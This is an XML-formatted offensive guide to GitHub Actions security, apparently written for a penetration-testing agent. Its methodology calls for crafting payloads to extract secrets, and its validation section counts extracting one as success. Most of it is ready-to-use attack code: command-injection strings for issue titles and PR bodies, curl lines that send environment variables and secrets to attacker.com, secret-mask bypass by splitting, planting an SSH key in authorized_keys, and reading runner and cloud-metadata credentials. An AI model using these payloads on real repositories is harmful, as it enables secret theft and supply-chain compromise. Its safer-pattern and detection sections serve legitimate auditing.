<vulnerability_guide>
  <title>GITHUB ACTIONS SECURITY - WORKFLOW INJECTION AND SECRET EXTRACTION</title>

  <critical>GitHub Actions workflows process untrusted input that can lead to code execution, secret extraction, and supply chain compromise. Workflow injection occurs when attacker-controlled data is interpolated into workflow commands. Combined with overly permissive workflows and repository configurations, attackers can steal secrets, modify code, or compromise downstream consumers.</critical>

  <scope>
    - Workflow expression injection via ${{ }} syntax
    - Command injection in run steps
    - Secrets exposure in logs and artifacts
    - Pull request workflow abuse (pull_request_target)
    - Self-hosted runner compromise
    - GITHUB_TOKEN permission abuse
    - Third-party action supply chain risks
  </scope>

  <methodology>
    1. **Enumerate workflows**: Review all .github/workflows/*.yml files
    2. **Identify injection points**: Find ${{ }} expressions with untrusted input
    3. **Analyze trigger events**: Check for dangerous triggers (pull_request_target, workflow_run)
    4. **Review permissions**: Identify overly permissive GITHUB_TOKEN and secrets
    5. **Exploit injection**: Craft payloads to extract secrets or execute code
  </methodology>

  <advanced_techniques>
    <expression_injection>
      Inject into workflow expressions:
      {% raw %}
      # Vulnerable workflow pattern
      - run: echo "Issue title: ${{ github.event.issue.title }}"
      - run: echo "PR body: ${{ github.event.pull_request.body }}"
      - run: echo "Comment: ${{ github.event.comment.body }}"

      # Injection payloads (in issue title, PR body, etc.)
      `id`
      $(id)
      a]"; id; echo "[
      "; curl attacker.com/$(cat /proc/self/environ | base64) #

      # Extract secrets via expression injection
      ${{ secrets.GITHUB_TOKEN }}
      $(curl -H "Authorization: token ${{ secrets.GITHUB_TOKEN }}" https://api.github.com/user)

      # Exfiltrate secrets
      "; curl -d @<(env) https://attacker.com/steal #
      {% endraw %}
    </expression_injection>

    <pull_request_target_abuse>
      Exploit pull_request_target with checkout of PR code:
      {% raw %}
      # Dangerous pattern - checks out PR code with write permissions
      on: pull_request_target
      jobs:
        build:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v3
              with:
                ref: ${{ github.event.pull_request.head.ref }}
                repository: ${{ github.event.pull_request.head.repo.full_name }}
            - run: npm install  # Executes attacker's package.json scripts

      # Attack: Fork repo, modify build scripts, create PR
      # package.json postinstall script executes with repository secrets

      # Safer pattern check: Ensure checkout uses base ref, not head
      ref: ${{ github.event.pull_request.base.ref }}
      {% endraw %}
    </pull_request_target_abuse>

    <workflow_run_abuse>
      Exploit workflow_run trigger:
      {% raw %}
      # Dangerous pattern - workflow_run with artifact consumption
      on:
        workflow_run:
          workflows: ["Build"]
          types: [completed]
      jobs:
        deploy:
          steps:
            - uses: actions/download-artifact@v3
            - run: ./deploy.sh  # Executes artifact from potentially untrusted PR

      # Attack: Malicious PR triggers Build workflow, uploads malicious artifact
      # workflow_run job downloads and executes malicious artifact
      {% endraw %}
    </workflow_run_abuse>

    <secret_extraction>
      Extract secrets from workflows:
      {% raw %}
      # Via expression injection (secret appears in logs)
      - run: |
          echo "${{ secrets.AWS_SECRET_KEY }}" | base64

      # Via artifact upload
      - run: env > secrets.txt
      - uses: actions/upload-artifact@v3
        with:
          name: secrets
          path: secrets.txt

      # Via cache poisoning
      - uses: actions/cache@v3
        with:
          path: ~/.cache
          key: ${{ github.run_id }}
      - run: echo "${{ secrets.NPM_TOKEN }}" > ~/.cache/token

      # Via network exfiltration
      - run: |
          curl -X POST -d "token=${{ secrets.DEPLOY_KEY }}" https://attacker.com/

      # GitHub masks secrets but can bypass with encoding/splitting
      - run: |
          TOKEN="${{ secrets.API_KEY }}"
          echo ${TOKEN:0:10}
          echo ${TOKEN:10}
      {% endraw %}
    </secret_extraction>

    <github_token_abuse>
      Abuse GITHUB_TOKEN permissions:
      {% raw %}
      # Check token permissions
      curl -H "Authorization: token $GITHUB_TOKEN" \
           https://api.github.com/repos/OWNER/REPO

      # With contents:write - modify code
      curl -X PUT -H "Authorization: token $GITHUB_TOKEN" \
           -d '{"message":"pwned","content":"<base64>","sha":"<current>"}' \
           https://api.github.com/repos/OWNER/REPO/contents/README.md

      # With actions:write - trigger workflows
      curl -X POST -H "Authorization: token $GITHUB_TOKEN" \
           https://api.github.com/repos/OWNER/REPO/actions/workflows/deploy.yml/dispatches \
           -d '{"ref":"main"}'

      # With packages:write - publish malicious package
      # With pages:write - modify GitHub Pages

      # Default permissions (if not restricted)
      # contents: read, packages: read, metadata: read
      # Can be elevated via permissions: key in workflow
      {% endraw %}
    </github_token_abuse>

    <self_hosted_runner_attack>
      Compromise self-hosted runners:
      {% raw %}
      # Runners may have access to internal network
      - run: |
          # Network enumeration
          ip addr
          cat /etc/resolv.conf
          nmap -sn 10.0.0.0/24

      # Persistent access on runner
      - run: |
          # Add SSH key
          mkdir -p ~/.ssh
          echo "ssh-rsa ATTACKER_KEY" >> ~/.ssh/authorized_keys

      # Steal runner credentials
      - run: |
          cat ~/.credentials
          cat /home/runner/.credentials_rsaparams

      # Access cloud metadata (if runner is in cloud)
      - run: |
          curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
      {% endraw %}
    </self_hosted_runner_attack>

    <action_supply_chain>
      Third-party action risks:
      {% raw %}
      # Vulnerable: Using mutable tag
      - uses: some-action/action@v1  # Can be updated maliciously

      # Vulnerable: Using branch reference
      - uses: some-action/action@main  # Always latest, unreviewed

      # Safer: Pin to specific commit SHA
      - uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608

      # Check action source for malicious code
      # Look for: base64 decode, curl/wget to unknown URLs, env dumps

      # Typosquatting attacks
      - uses: actons/checkout@v3  # Typo: "actons" vs "actions"
      {% endraw %}
    </action_supply_chain>

    <pwn_requests>
      Exploit "Pwn Request" pattern:
      {% raw %}
      # Classic Pwn Request: pull_request_target + checkout of PR head
      # 1. Fork repository
      # 2. Modify .github/workflows or build scripts
      # 3. Create pull request
      # 4. Workflow runs with base repo secrets + PR code

      # Detection patterns to look for:
      on: pull_request_target
      on: issue_comment
      on: workflow_run

      # Combined with:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      # And any script execution:
      - run: npm install
      - run: make build
      - run: ./script.sh
      {% endraw %}
    </pwn_requests>
  </advanced_techniques>

  <validation>
    - Successfully inject commands via expression interpolation
    - Extract at least one secret via logs, artifacts, or exfiltration
    - Demonstrate code execution in workflow context
    - Identify workflows vulnerable to Pwn Request pattern
    - Document GITHUB_TOKEN permission scope and abuse potential
  </validation>

  <false_positives>
    - Expressions used in safe contexts (if conditions, environment names)
    - Secrets properly masked and not extractable
    - Branch protection preventing malicious PR merges
    - CODEOWNERS requiring approval for workflow changes
    - Restricted GITHUB_TOKEN permissions
  </false_positives>

  <detection_indicators>
    - Workflow runs from forked repositories
    - Unusual outbound network connections from runners
    - Artifact contents containing environment variables
    - API calls using GITHUB_TOKEN outside normal patterns
    - Workflow modifications in pull requests
  </detection_indicators>

  <pro_tips>
    - Always search for ${{ github.event in workflow files - common injection point
    - pull_request_target + checkout of PR code = likely vulnerability
    - Check if actions can be triggered by external contributors
    - Review all uses of ${{ secrets.* }} in run commands
    - Pin actions to SHA, not tags, to prevent supply chain attacks
    - Self-hosted runners in cloud may expose instance metadata
    - GITHUB_TOKEN permissions should follow least privilege
    - Composite actions can hide malicious code in nested dependencies
  </pro_tips>

  <remember>GitHub Actions workflows with pull_request_target, issue_comment, or workflow_run triggers that process PR code with repository secrets are prime targets for supply chain attacks affecting the entire project.</remember>
</vulnerability_guide>
